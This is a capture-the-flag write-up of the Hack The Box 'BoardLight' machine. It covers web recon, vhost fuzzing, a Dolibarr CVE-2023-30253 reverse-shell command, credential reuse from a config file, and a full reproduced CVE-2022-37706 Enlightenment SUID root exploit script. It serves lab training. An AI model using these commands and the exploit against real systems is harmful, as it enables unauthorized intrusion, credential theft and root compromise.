# BoardLight box

URL: https://app.hackthebox.com/machines/BoardLight

## Reconaissance

Target IP Address: `10.10.11.11`

Use nmap to scan ports.

Results:
```text
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH0dV4gtJNo8ixEEBDxhUId6Pc/8iNLX16+zpUCIgmxxl5TivDMLg2JvXorp4F2r8ci44CESUlnMHRSYNtlLttiIZHpTML7ktFHbNexvOAJqE1lIlQlGjWBU1hWq6Y6n1tuUANOd5U+Yc0/h53gKu5nXTQTy1c9CLbQfaYvFjnzrR3NQ6Hw7ih5u3mEjJngP+Sq+dpzUcnFe1BekvBPrxdAJwN6w+MSpGFyQSAkUthrOE4JRnpa6jSsTjXODDjioNkp2NLkKa73Yc2DHk3evNUXfa+P8oWFBk8ZXSHFyeOoNkcqkPCrkevB71NdFtn3Fd/Ar07co0ygw90Vb2q34cu1Jo/1oPV1UFsvcwaKJuxBKozH+VA0F9hyriPKjsvTRCbkFjweLxCib5phagHu6K5KEYC+VmWbCUnWyvYZauJ1/t5xQqqi9UWssRjbE1mI0Krq2Zb97qnONhzcclAPVpvEVdCCcl0rYZjQt6VI1PzHha56JepZCFCNvX3FVxYzEk=
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK7G5PgPkbp1awVqM5uOpMJ/xVrNirmwIT21bMG/+jihUY8rOXxSbidRfC9KgvSDC4flMsPZUrWziSuBDJAra5g=
|   256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHj/lr3X40pR3k9+uYJk4oSjdULCK0DlOxbiL66ZRWg
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Access website:

Website use PHP, Apache/2.4.41 (Ubuntu)

The SEND and Subcribe button don't send any body to the server.
It seems that no element in the main page of website can be exploited.
Try to use gobuster to find hidden page.

Use wordlist from https://github.com/danielmiessler/SecLists/

Scan directories:
```bash
gobuster dir -u http://10.10.11.11 -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt
```

Don't find any dir.

Scan subdomain: don't find any interesting.

Scan vhost:

```bash
ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200 -fc 404 -t 40 -fs 15949
```

Got it:
```text
crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 66ms]
```

## Foothold
Add the vhost to hosts file:
```text
# /etc/hosts
# For HTB
10.10.11.11 board.htb
10.10.11.11 crm.board.htb
```

Access website: http://crm.board.htb

![alt text](dolibarr.png)

The version of Dolibarr is 17.0.0. Take some search on Google and found this PoC, but it doesn't work: https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

Found another git repo: https://github.com/Rubikcuv5/cve-2023-30253

The default credential is `admin/admin`. It seems to be a misconfiguration case.

```bash
python3 CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -r  10.10.14.50  8081
```

Successfully get a reverse shell.

Check in `/etc/passwd` and found a user: `larissa`

Take some search on configuration files and found this:
```text
# /var/www/html/crm.board.htb/htdocs/conf/conf.php

$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
```
Try to login via ssh with `larissa/serverfun2$2023!!`. Successfully.

## Root Escalation
Check with [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) but don't find any exploitation point.

Try to find suid:
```bash
find / -perm -4000 2>/dev/null
```

Found a binary called `enlightenment`.
Search on exploit-db and found this exploitation: https://www.exploit-db.com/exploits/51180

```bash
#!/usr/bin/bash
# Idea by MaherAzzouz
# Development by nu11secur1ty

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

# The actual problem
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Welcome to the rabbit hole :)"

${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net

```

Grab the bash script and execute it -> Got the root flag.
